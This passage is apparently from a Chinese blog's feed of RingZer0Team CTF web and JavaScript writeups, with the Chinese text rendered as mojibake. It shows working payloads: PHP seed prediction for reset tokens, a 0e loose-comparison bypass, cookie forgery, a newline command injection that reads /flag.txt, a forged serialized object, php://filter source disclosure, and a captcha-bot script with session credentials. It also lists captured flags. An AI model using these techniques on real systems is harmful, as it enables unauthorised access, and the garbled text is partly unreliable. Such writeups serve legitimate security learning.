something?ç»™äº†ä¸€æ®µä¸çŸ¥æ‰€äº‘çš„æ–‡å­—ã€‚ã€‚ä¸æ‡‚å°±æŠ“åŒ…å’¯ã€‚æŠ“åŒ…åŽåœ¨cookieå¤„å‘çŽ°flagï¼š0ã€‚ä¿®æ”¹åŽå‘åŒ…å¾—åˆ°flagï¼š flag:1FLAG-AnlAb6QxDpQvg1yn2bAhyOJw Admin Panelæœ‰ä¸€ä¸ªç™»é™†æ¡†ï¼Œéšä¾¿è¾“ç‚¹ä»€ä¹ˆè¿›åŽ»ï¼ŒæŠ“åŒ…åŽå‘çŽ°ä¸€ä¸ª302è·³è½¬ï¼Œåœ¨è·³è½¬é¡µé¢é‡Œæœ‰ä¸€ä¸ªå¥‡æ€ªçš„ä¸œè¥¿ï¼Œè§ä¸‹ï¼š å°†æ–¹æ³•æ”¹æˆGETè¯·æ±‚ï¼Œåœ¨å°¾éƒ¨æ·»åŠ ï¼š?showflagforme=yesIwantaflaã€‚è§ä¸‹ï¼š å¾—åˆ°flagï¼š1FLAG-Sfi8sZgAK0ddMjVSOQU2rMfUWS Captcha Ié¢˜ç›®åœ°å€ï¼šhttp://captcha.ringzer0team.com:7421/form1.phpæµ‹è¯•ä¸€æ¬¡åŽï¼Œé¢˜ç›®æç¤ºè¯´è¦éªŒè¯ä¸€åƒæ¬¡ã€‚æŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥å‘çŽ°å¦‚ä¸‹jsä»£ç ï¼š1234567891011&lt;script&gt;function doIt()&#123; var A = document.getElementById('captcha-form').value; if (A == "ehage")&#123; document.forms["Form1"].submit(); &#125; else &#123; alert("BAD Captcha"); &#125;&#125;&lt;/script&gt; å…¶ä¸­ifåˆ¤æ–­æ¡ä»¶é‡Œçš„ehageå°±æ˜¯å½“å‰çš„éªŒè¯ç ï¼Œæ‰€ä»¥åªè¦å†™è„šæœ¬æå–å‡ºè¿™æ®µå­—ç¬¦ä¸²ï¼Œç„¶åŽå†å‘åŒ…å°±è¡Œå•¦ã€‚è„šæœ¬å¦‚ä¸‹ï¼š123456789101112131415import requestscookie = &#123;'_ga':'GA1.2.1373385590.1498799275','_gid':'GA1.2.867459789.1498799275','_gat':'1','PHPSESSID':'1kr76vh1164sbgeflnngimi321'&#125;url = 'http://captcha.ringzer0team.com:7421'headers = &#123;'Authorization':'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='&#125;for i in range(1000): # get captacha r = requests.get("http://captcha.ringzer0team.com:7421/form1.php",cookies=cookie,headers=headers) start_addr = r.text.find('if (A == "') + len('if (A == "') end_addr = r.text.find('"',start_addr) captcha = r.text[start_addr:end_addr] print(i,":",captcha) k = requests.get("http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new",cookies=cookie,headers=headers) data = &#123;'captcha': captcha&#125; k = requests.post('http://captcha.ringzer0team.com:7421/captcha1.php',cookies=cookie,headers=headers,data=data) è·‘å®ŒåŽå¾—åˆ°flagï¼š1Congrats The flag is &quot;9bc635d4385e8a1775ad98980f44eb7d1714f69b&quot; Password resetæœ‰ä¸€ä¸ªç™»é™†æ¡†ï¼Œéœ€è¦ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿˜æœ‰ä¸€ä¸ªé‡ç½®ï¼ˆresetï¼‰åŠŸèƒ½ã€‚é¢˜ç›®æä¾›äº†æºç ã€‚å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425&lt;?phpif(isset($_POST['reset_username'])) &#123; srand(time()); $token = rand(1000000000000000,9999999999999999); $success = '&lt;div class="success"&gt;Reset password link has been sent to admin@youdontownthisemail.com. Please follow the link ...' $hSql-&gt;FastQuery('DELETE FROM chal_113 WHERE ip_addr = ?', array($_SERVER['REMOTE_ADDR'])); $hSql-&gt;FastQuery('insert into chal_113 values (?,?,?)', array($_SERVER['REMOTE_ADDR'], $token, time() + 3600));&#125;if(URL_HANDLE::GetInstance()-&gt;get-&gt;k != null) &#123; $result = reset($hSql-&gt;FastQuery('SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? ', array($_SERVER['REMOTE_ADDR'], URL_HANDLE::GetInstance()-&gt;get-&gt;k))); if($hSql-&gt;RowCount() != 0) &#123; if($result-&gt;expired_time &gt; time()) &#123; $success = '&lt;div class="success"&gt;Here\'s your new password: XXXXXXXXXXXXXX&lt;/div&gt;'; &#125; else &#123; $success = '&lt;div class="error"&gt;Expired recovery key!&lt;/div&gt;'; &#125; &#125; else &#123; $success = '&lt;div class="error"&gt;Invalid recovery key!&lt;/div&gt;'; &#125;&#125;?&gt; ä¼ªéšæœºæ•°é—®é¢˜ï¼Œè¿˜æœ‰å°±æ˜¯å…³äºŽunixæ—¶é—´æˆ³çš„çŸ¥è¯†ã€‚ç›®æ ‡å¾ˆæ˜Žç¡®è¦å¯¹adminé‡ç½®å¯†ç ï¼Œå½“ç‚¹äº†resetåŽï¼Œä¼šæ ¹æ®å½“å‰çš„timeç”Ÿæˆä¸€ä¸ªtokenå¹¶å­˜æ”¾åœ¨æ•°æ®åº“ä¸­ï¼Œè¿™ä¸ªå°±æ˜¯ä¸‹æ–‡çš„kå€¼ã€‚ æ³¨æ„å›¾ç‰‡ä¸­æ˜¯ï¼š2017 06:39:41 -0400ã€‚è®°å¾—è®¡ç®—ä¸Šæ—¶å·®ä¸º4ä¸ªå°æ—¶ã€‚æ‰€ä»¥å®žé™…æ—¶é—´åº”è¯¥æ˜¯2017-07-01 10:39:41ã€‚å†™ä¸€ä¸ªphpè„šæœ¬ï¼Œç”Ÿæˆéœ€è¦çš„16ä½çš„digit codeã€‚1234567&lt;?php$t = strtotime('2017-07-01 10:39:41');echo($t . "&lt;br&gt;");srand($t);$token = rand(1000000000000000,9999999999999999);echo $token;?&gt; ä¸Šé¢ä»£ç åœ¨winå¹³å°ä¸‹æ— æ³•ç”Ÿæˆ16ä½çš„codeï¼Œè¿™ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ã€‚ã€‚æˆ‘æ¢åˆ°unixçŽ¯å¢ƒåŽç”Ÿæˆçš„tokenä¸º 32933381064794967ã€‚è®¿é—®ï¼š1http://ringzer0team.com/challenges/113/?k=3293338106479496 å¾—åˆ°hintï¼š1Here&apos;s your new password: Thi%P@s50rD!sM1n3* ç™»é™†ï¼Œå¾—åˆ°flagï¼š1FLAG-DlwwTV7vCQf4Dn281Yhb802x5U PHP Fairyæœ‰ä¸€ä¸ªç™»é™†æ¡†ã€‚é¢˜ç›®ç»™äº†æºç 12345678910111213141516171819202122232425262728&lt;?php$output = "";if (isset($_GET['code'])) &#123; $content = file_get_contents(__FILE__); $content = preg_replace('/FLAG\-[0-9a-zA-Z_?!.,]+/i', 'FLAG-XXXXXXXXXXXXXXXXXXXXXXX', $content); echo '&lt;div class="code-highlight"&gt;'; highlight_string($content); echo '&lt;/div&gt;';&#125;if (isset($_GET['pass'])) &#123; if(!preg_match('/^[^\W_]+$/', $_GET['pass'])) &#123; $output = "Don't hack me please :("; &#125; else &#123; $pass = md5("admin1674227342"); if ((((((((($_GET['pass'] == $pass)))) &amp;&amp; (((($pass !== $_GET['pass']))))) || ((((($pass == $_GET['pass'])))) &amp;&amp; ((($_GET['pass'] !== $pass)))))))) &#123; // Trolling u lisp masta if (strlen($pass) == strlen($_GET['pass'])) &#123; $output = "&lt;div class='alert alert-success'&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;"; &#125; else &#123; $output = "&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"; &#125; &#125; else &#123; $output = "&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"; &#125; &#125;&#125;?&gt; è€ƒå¯Ÿphpå¼±ç±»åž‹ã€‚ç»è¿‡md5åŠ å¯†åŽç”Ÿæˆä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œè€Œä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²ç”¨==æ¯”è¾ƒæ—¶ä¼šè¢«è½¬æ¢æˆ0 == 0å³æˆç«‹ã€‚è€Œ!== ä¸ä»…æ¯”è¾ƒå€¼ï¼Œè€Œä¸”è¿˜ä¼šæ¯”è¾ƒç±»åž‹ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦ä¼ å…¥passçš„å€¼ä¸ºä¸€ä¸ª0eå¼€å¤´çš„å€¼ï¼Œå¹¶ä¸”é•¿åº¦ä¸º32ä½ï¼ˆ$passé•¿åº¦ä¸º32ä½ï¼‰ï¼Œæ¯”å¦‚è¯´ï¼š0e509367213418206700842008763514ã€‚ å¾—åˆ°flagï¼š1FLAG-K7PY48gt02T1yvoO9jzP694FztgR1jIS Malicious upload ä¸Šä¼ é¢˜ï¼Œä¸€èˆ¬å…³æ³¨æ–‡ä»¶ååŽç¼€å’Œcontent-typeã€‚ç»è¿‡fuzzï¼šï¼‰çŸ¥é“ï¼Œå¯¹filenameï¼ŒæœåŠ¡å™¨ç«¯çš„æ£€æµ‹æ—¶ä»Žå·¦å‘å³åŒ¹é….xxxï¼Œè‹¥é‡åˆ°çš„ç¬¬ä¸€ä¸ª.xxxä¸æ˜¯pngåˆ™ä¸Šä¼ å¤±è´¥ï¼Œå¦ä¸€ä¸ªå°±æ˜¯éœ€è¦æŠŠcontent-typeè®¾ç½®ä¸ºimage/png å¾—åˆ°flagï¼š1FLAG-ve46i9UFtDh8Xd4hnqKRkP17 Security through obscurity!é¢˜ç›®è¯´ï¼šYou don&#39;t have admin access.ã€‚ä¸€è„¸æ‡µé€¼ï¼ŒæŠ“åŒ…å‘çŽ°ä¸€ä¸ªå¥‡å¥‡æ€ªæ€ªçš„cookieï¼š çœ‹ç€ã€‚ã€‚å°±å¾ˆåƒbase64åŠ å¯†ï¼›) 123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode('Z3Vlc3QsZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LGZhbHNlOjIyOWQ3NDU5MmQ5MjNiOThlZjA3NjViNTU5OTkyZDI1')b'guest,e738b099a664e00e,1498908736,false:229d74592d923b98ef0765b559992d25' åŽé¢é‚£ä¸²æ„Ÿè§‰å¾ˆåƒmd5ï¼Œè§£å¯†æ— æžœã€‚æƒ³æƒ³å…ˆå°è¯•æ”¹æ”¹ä¸€äº›ä¸œè¥¿,ï¼Œæ¯”å¦‚æŠŠguestæ”¹æˆadminï¼Œfalseæ”¹æˆtrueï¼Œbase64åŠ å¯†åŽå¾—åˆ°ï¼š1YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LHRydWU6MjI5ZDc0NTkyZDkyM2I5OGVmMDc2NWI1NTk5OTJkMjU= æ‰€ä»¥åŸºæœ¬å¯ä»¥æ–­å®šåŽé¢é‚£ä¸²æ˜¯md5ï¼Œå‘åŒ…åŽï¼Œæç¤ºä¹‹åŽæˆ‘æŠŠåŽŸå§‹çš„åŒ…ï¼Œæ²¡æœ‰æ”¹è¿‡cookieçš„åŒ…ç›´æŽ¥fowwardæŽ‰åŽæç¤ºè¯´ï¼š1Expired cookie. è¯´æ˜Žæœ‰æ—¶é—´é™åˆ¶ï¼Œç»“åˆå‰é¢åšè¿‡çš„é¢˜ç›®æŽ¨æ–­1498908736æ˜¯unixæ—¶é—´æˆ³ï¼Œå®ƒå¯ä»¥ç›´æŽ¥è½¬æ¢ä¸º2017/7/1 19:32:16ã€‚æŽ¥ä¸‹æ¥ï¼Œä»Žæ•´ä½“ä¸Šçœ‹ä¸€ä¸‹è¿™ä¸ªcookieï¼Œå®ƒè¢«å†’å·:åˆ†ä¸ºä¸¤æ®µã€‚æ‰€ä»¥ï¼š1md5(&quot;guest,e738b099a664e00e,1498908736,false&quot;) =&gt; 229d74592d923b98ef0765b559992d25 ä¸è¿‡ï¼Œç¬¬äºŒä¸ªå€¼ä¸æ¸…æ¥šæ˜¯å¦‚ä½•ç”Ÿæˆçš„ï¼Œä¹Ÿè®¸åªæ˜¯ä¸ªéšæœºå€¼ã€‚æ‰€ä»¥æˆ‘ä»¬æ”¹ä¸€æ”¹ï¼Œè®°å¾—æŠŠunixæ—¶é—´æˆ³æ”¹å¤§ä¸€ç‚¹ä¸ç„¶ä¼šæç¤ºè¿‡æœŸï¼š123md5(&quot;admin,e738b099a664e00e,1498999999,true&quot;) =&gt; 05fda7a65b3ac89393e7de85bc8db295base64(&quot;admin,e738b099a664e00e,1498999999,true:05fda7a65b3ac89393e7de85bc8db295&quot;) =&gt; YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTk5OTk5LHRydWU6MDVmZGE3YTY1YjNhYzg5MzkzZTdkZTg1YmM4ZGIyOTU= å¾—åˆ°flagï¼š1FLAG-Feg03OSzWhxO03K94108100f REST in peaceé¢˜ç›®æç¤ºï¼šYour goal is to get superadmin accessé¢˜ç›®åœ°å€æ˜¯ï¼šhttps://ringzer0team.com/challenges_page/web100_c0f8a764ea6592548917aaf18261f42c.phpç›´æŽ¥è®¿é—®ä¼šæ˜¾ç¤ºAccess Deniedã€‚æŠ“åŒ…åŽåœ¨å“åº”åŒ…å¤´éƒ¨å‘çŽ°å¥‡æ€ªçš„ä¸œä¸œï¼Œè§ä¸‹ï¼š å‘çŽ°æ˜¯sha512åŠ å¯†ï¼Œç®€å•å’¯ï¼š å°†å­—ç¬¦ä¸²adminç»è¿‡sha512åŠ å¯†åŽï¼Œåœ¨è¯·æ±‚åŒ…ä¸­æ·»åŠ Strong-Authå­—æ®µã€‚å‘é€åŽå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š1234Document title security levelThe secret of the universe.docx privateBe Better In Bed By Richard MacDonald.docx publicThis file may contain a flag or not.docx extremely private ç„¶åŽï¼Œï¼Œç„¶åŽæˆ‘è¿˜æ²¡åšå‡ºæ¥ã€‚å¾…ç»­ã€‚ PHP feature or 0day?é¢˜ç›®ç»™äº†æºç ã€‚123456789101112&lt;?phpini_set('error_displays', 0);$ip = htmlspecialchars($_GET['url'], ENT_QUOTES);$f = fsockopen($ip, 80, $errno, $errstr, 5);if($f) &#123; $result = shell_exec('ping -c 4 ' . $ip); echo '&lt;div class="alert alert-success"&gt;' . nl2br($result) . '&lt;/div&gt;';&#125; else &#123; echo '&lt;div class="alert alert-danger"&gt;' .$errstr . '&lt;/div&gt;';&#125;?&gt; %0aç»•è¿‡å³å¯ã€‚payload1:1127.0.0.1%0als / å‘çŽ°æœ‰flag.txtã€‚ payload2ï¼š1127.0.0.1%0acat /flag.txt å¾—åˆ°flagï¼š1FLAG-v0195ZH325rG9m20043Blm92LeRE77aF Password reset reloadedé¢˜ç›®æä¾›äº†æºç ã€‚ä¼ªéšæœºæ•°çš„é—®é¢˜ï¼Œè·Ÿå‰é¢çš„reset passwdçš„é¢˜ä¸€æ ·ï¼Œç‚¹äº†resetåŽï¼Œä¼šæç¤ºè¯´ï¼š1Reset password link has been sent to admin@youdontownthisemailagain.com. Please follow the link http://ringzer0team.com/challenges/120/?k=[your 16 digits code] soon as possible your token expired in 1 hour. æ‰€ä»¥ä¸ºäº†å¾—åˆ°16ä½digits codeï¼Œéœ€è¦å¾—åˆ°randomDigitã€‚ä¸ºå¾—åˆ°randomDigitï¼Œéœ€è¦å…ˆå¾—åˆ°seedã€‚è€Œseedç”±$seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2));ç”Ÿæˆã€‚ç”¨å¦‚ä¸‹phpä»£ç ç”Ÿæˆï¼š12345678910111213&lt;?php $token = ""; $size = 32; $seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2)); srand($seed); for($i = 0; $i &lt; 16; $i++) &#123; $randomDigit = (string)rand() % 10; $token .= "," . $randomDigit; &#125; $token = str_replace(",", "", $token); echo $token;?&gt; å¾—åˆ°16ä½digit codeä¸º3675356291270936ã€‚è®¿é—®ï¼š1https://ringzer0team.com/challenges/120/?k=3675356291270936 å¾—åˆ°passwdï¼šCrytoIsCool!1337ã€‚ç™»é™†å¾—åˆ°flagï¼š1FLAG-LPmaGkfnDHrsMoOyHA7nIjOPRy Serial killer!ç‚¹è¿›åŽ»æ—¶é“¾æŽ¥æ˜¯ï¼š1https://ringzer0team.com/challenges/41/?o=TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjoxOntzOjY6ImFjdGlvbiI7czoxNDoiR2V0Q3VycmVudERhdGUiO319 åŽé¢è·Ÿçš„ä¸€ä¸²base64åŠ å¯†ï¼Œè§£å¯†åŽä¸ºï¼š1&apos;O:11:&quot;RandomClass&quot;:1:&#123;s:20:&quot;\x00RandomClass\x00uStruct&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:6:&quot;action&quot;;s:14:&quot;GetCurrentDate&quot;;&#125;&#125;&apos; æ³¨æ„è§£å¯†åŽé‡Œæœ‰\x00ï¼Œæ˜¯ä¸å¯æ˜¾ç¤ºå­—ç¬¦ã€‚ä»Žbase64è§£å¯†ç»“æžœçŒœæµ‹ä¸ºphpååºåˆ—åŒ–é—®é¢˜ã€‚æˆ‘ä»¬éšä¾¿å‚æ•°æ”¹æ”¹ï¼Œä¼ è¿›åŽ»è¯•è¯•ï¼Œç»“æžœå¾—åˆ°æŠ¥é”™ï¼š æ ¼å¼åŒ–åŽæºç å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041class RandomClass &#123; private static $instance; private $uStruct; public function __construct() &#123; $this-&gt;uStruct = (object)array(); &#125; public static function GetInstance() &#123; if(!isset(self::$instance)) &#123; self::$instance = new self(); &#125; return self::$instance; &#125; public function __set($key, $value) &#123; $this-&gt;uStruct-&gt;$key = $value; &#125; public function __get($key) &#123; return $this-&gt;uStruct-&gt;$key; &#125; public function DoAction() &#123; $action = $this-&gt;uStruct-&gt;action; $this-&gt;$action(); &#125; public function GetCurrentDate() &#123; GetCurrentDate($this-&gt;uStruct); &#125; public function ShowFlag() &#123; if($this-&gt;uStruct-&gt;time !== null &amp;&amp; $this-&gt;uStruct-&gt;flag == 'Please?') &#123; ShowFlag($this-&gt;uStruct); &#125; &#125; public function GetOutput() &#123; return $this-&gt;uStruct-&gt;output; &#125;&#125; ç”±æºç çŸ¥é“ï¼ŒuStructç”±(object)array()å¾—åˆ°ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®uStructçš„actionæŒ‡ä¸ºâ€™ShowFlagâ€™ï¼Œè¿™æ ·æ‰ä¼šè°ƒç”¨ShowFlagå‡½æ•°ã€‚è®¾ç½®uStructçš„flagå€¼ä¸ºâ€™Please?â€™ï¼Œè®¾ç½®uStructçš„timeå€¼ä¸ä¸ºç©ºï¼Œæ‰èƒ½æ­£ç¡®æ‰“å°å‡ºflagã€‚ç”¨å¦‚ä¸‹è„šæœ¬æž„é€ ï¼š1234567891011121314&lt;?phpclass RandomClass &#123; private static $instance; private $uStruct; public function __construct() &#123; $this-&gt;uStruct = (object)array('action'=&gt;'ShowFlag','time' =&gt; '1','flag' =&gt; 'Please?'); &#125;&#125;$chybeta = new RandomClass();echo serialize($chybeta);?&gt; å¾—åˆ°ï¼š1O:11:&quot;RandomClass&quot;:1:&#123;s:20:&quot;RandomClassuStruct&quot;;O:8:&quot;stdClass&quot;:3:&#123;s:6:&quot;action&quot;;s:8:&quot;ShowFlag&quot;;s:4:&quot;time&quot;;s:1:&quot;1&quot;;s:4:&quot;flag&quot;;s:7:&quot;Please?&quot;;&#125;&#125; ä¸ºèƒ½è®©æœåŠ¡å™¨ç«¯æ­£ç¡®è§£æžï¼Œéœ€è¦å†åŠ å…¥ä¸¤ä¸ªä¸å¯è§å­—ç¬¦\x00ï¼Œç”¨pythonè„šæœ¬å¦‚ä¸‹:1234import base64# a = 'O:11:"RandomClass":1:&#123;s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":1:&#123;s:6:"action";s:14:"GetCurrentDate";&#125;&#125;';a ='O:11:"RandomClass":1:&#123;s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":3:&#123;s:6:"action";s:8:"ShowFlag";s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";&#125;&#125; 'print base64.b64encode(a) å¾—åˆ°ï¼š1TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjozOntzOjY6ImFjdGlvbiI7czo4OiJTaG93RmxhZyI7czo0OiJ0aW1lIjtzOjE6IjEiO3M6NDoiZmxhZyI7czo3OiJQbGVhc2U/Ijt9fSA= æŠ“åŒ…ï¼Œæ›¿æ¢å‚æ•°ï¼Œå¦‚ä¸‹ï¼š å¾—åˆ°flagï¼š1FLAG-Wz87W7Rv0nmK75Hmbq41qc2i Looking for the flag?å¯ä»¥ç”¨php://filterè¯»åˆ°æºç ï¼š1http://ringzer0team.com:1008/?page=php://filter/read=convert.base64-encode/resource=index.php å¾—åˆ°flagï¼š1FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ringzer0team-js-writeup]]></title>
      <url>%2F2017%2F06%2F30%2F%C2%96ringzer0team-js-writeup%2F</url>
      <content type="text"><![CDATA[æœªå®Œå¾…ç»­..å¾…ç»­.. Client side validation is so secure? æŸ¥çœ‹æºä»£ç ï¼Œå‘çŽ°ä¸‹é¢çš„js123456789101112131415&lt;script&gt; // Look's like weak JavaScript auth script :) $(".c_submit").click(function(event) &#123; event.preventDefault() var u = $("#cuser").val(); var p = $("#cpass").val(); if(u == "admin" &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125; &#125;);&lt;/script&gt; ç”¨æŽ§åˆ¶å°è¿è¡Œä¸€ä¸‹å¾—åˆ°å¯†ç ä¸ºï¼š12String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)&quot;JavaScriptIsSecure&quot; å¡«å…¥è´¦å·adminï¼Œå¯†ç JavaScriptIsSecureï¼Œå¾—åˆ°flagï¼š1FLAG-66Jq5u688he0y46564481WRh Is hashing more secure?æŸ¥çœ‹æºä»£ç ï¼Œå‘çŽ°jsï¼š1234567891011$(".c_submit").click(function(event) &#123; event.preventDefault(); var p = $("#cpass").val(); if(Sha1.hash(p) == "b89356ff6151527e89c4f3e3d30c8e6586c63962") &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125;&#125;); å·¥å…·ç½‘ç«™ï¼šhttp://hashtoolkit.comå¾—åˆ°å¯†ç ä¸ºï¼›adminzã€‚å¡«å…¥ï¼Œå¾—åˆ°flagã€‚1FLAG-bXNsYg9tLCaIX6h1UiQMmMYB Then obfuscation is more secure?1234&lt;script&gt; // Look's like weak JavaScript auth script :) var _0xc360=["\x76\x61\x6C","\x23\x63\x70\x61\x73\x73","\x61\x6C\x6B\x33","\x30\x32\x6C\x31","\x3F\x70\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65","\x63\x6C\x69\x63\x6B","\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"];$(.c_submit)[click](function ()&#123;var _0xf382x1=$(#cpass)[val]();var _0xf382x2=alk3;if(_0xf382x1==02l1+_0xf382x2)&#123;if(document[location][href][indexOf](?p=)==-1)&#123;document[location]=document[location][href]+?p=+_0xf382x1;&#125; ;&#125; else &#123;$(#cresponse)[html](&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;);&#125; ;&#125; );&lt;/script&gt; æ‹–åˆ°http://ddecode.com/è§£ä¸€ä¸‹å¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š 12345// Look's like weak JavaScript auth script :)var _0xc360 = ["val", "#cpass", "alk3", "02l1", "?p=", "indexOf", "href", "location", "&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;", "html", "#cresponse", "click", ".c_submit"];$(_0xc360[12])[_0xc360[11]](function() &#123; var _0xf382x1 = $(_0xc360[1])[_0xc360[0]](); var _0xf382x2 = _0xc360[2]; if (_0xf382x1 == _0xc360[3] + _0xf382x2) &#123; if (document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4]) == -1) &#123; document[_0xc360[7]] = document[_0xc360[7]][_0xc360[6]] + _0xc360[4] + _0xf382x1; &#125;; &#125; else &#123; $(_0xc360[10])[_0xc360[9]](_0xc360[8]); &#125;;&#125;); è‡ªå·±å†æ›¿æ¢ä¸€ä¸‹ã€‚æ€»ç®—èƒ½çœ‹äº†ã€‚ 12345678910111213var _0xc360 = ["val", "#cpass", "alk3", "02l1", "?p=", "indexOf", "href", "location", "&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;", "html", "#cresponse", "click", ".c_submit"];$(".c_submit")["click"](function() &#123; var _0xf382x1 = $("#cpass")["val"](); var _0xf382x2 = "alk3"; if (_0xf382x1 == "02l1" + _0xf382x2) &#123; if (document["location"]["href"]["indexOf"]("?p=",) == -1) &#123; document["location"] = document["location"]["href"] + "?p=", + _0xf382x1; &#125;; &#125; else &#123; $("#cresponse")["html"]("&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"); &#125;;&#125;); æ‰€ä»¥å¯†ç æ˜¯ 02l1alk3ï¼Œå¾—åˆ°flagï¼š1FLAG-5PJne3T8d73UGv4SCqN44DXj Why not?12345678910111213141516171819202122232425$(".c_submit").click(function(event) &#123; event.preventDefault(); var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = $("#cuser").val(); var p = $("#cpass").val(); var t = true; if(u == "administrator") &#123; for(i = 0; i &lt; u.length; i++) &#123; if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); t = false; break; &#125; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); t = false; &#125; if(t) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125;&#125;); å†™ä¸€ä¸ªjsè„šæœ¬ã€‚123456789&lt;script&gt; var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = "administrator"; var p = ""; for (i = 0; i &lt; u.length; i++)&#123; p += String.fromCharCode(k[i] - i * 10 - u.charCodeAt(i) ); &#125; alert(p);&lt;/script&gt; å¼¹æ¡†å¾—åˆ°ç»“æžœï¼šOhLord4309111ï¼Œå¾—åˆ°flagï¼š1FLAG-65t23674o6N2NehA44272G24 Valid key required1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;script&gt; function curry( orig_func ) &#123; var ap = Array.prototype, args = arguments; function fn() &#123; ap.push.apply( fn.args, arguments ); return fn.args.length &lt; orig_func.length ? fn : orig_func.apply( this, fn.args ); &#125; return function() &#123; fn.args = ap.slice.call( args, 1 ); return fn.apply( this, arguments ); &#125;; &#125; function callback(x,y,i,a) &#123; return !y.call(x, a[a["length"]-1-i].toString().slice(19,21)) ? x : &#123;&#125;; &#125; var ref = &#123;T : "BG8",J : "jep",j : "M2L",K : "L23",H : "r1A"&#125;; function validatekey() &#123; e = false; var _strKey = ""; try &#123; _strKey = document.getElementById("key").value; var a = _strKey.split("-"); if(a.length !== 5) e = true; var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function)); if(!equal(o,ref)) e = true; &#125;catch(e)&#123; e = true; &#125; if(!e) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + _strKey; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125; &#125; function equal(o,o1) &#123; var keys1 = Object.keys(o1); var keys = Object.keys(o); if(keys1.length != keys.length) return false; for(var i=0;i&lt;keys.length;i++) if(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]]) return false; return true; &#125; function hook(f1,f2,f3) &#123; return function(x) &#123; return f2(f1(x),f3(x));&#125;; &#125; var h = curry(hook); var fn = h(function(x) &#123;return x &gt;= 48;&#125;,new Function("a","b","return a &amp;&amp; b;")); function genFunc(_part) &#123; if(!_part || !(_part.length) || _part.length !== 4) return function() &#123;&#125;; return new Function(_part.substring(1,3), "this." + _part[3] + "=" + _part.slice(1,3) + "+" + (fn(function(y)&#123;return y&lt;=57&#125;)(_part.charCodeAt(0)) ? _part[0] : "'"+ _part[0] + "'")); &#125;&lt;/script&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN-pwn-writeup]]></title>
      <url>%2F2017%2F06%2F29%2FXMAN-pwn-writeup%2F</url>
